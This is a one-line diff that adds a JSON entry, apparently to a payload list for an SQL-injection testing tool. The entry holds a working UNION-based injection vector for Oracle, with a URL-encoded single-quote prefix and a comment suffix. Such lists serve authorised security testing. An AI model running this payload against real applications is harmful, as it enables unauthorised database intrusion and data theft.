@@ -1,0 +1,1 @@
+{"dbms": "oracle", "technique": "union", "boundary": {"prefix": "%27", "suffix": "-- -", "type": "single-enc"}, "vector": "{B} UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM dual", "comment": "oracle union: url-enc single"}
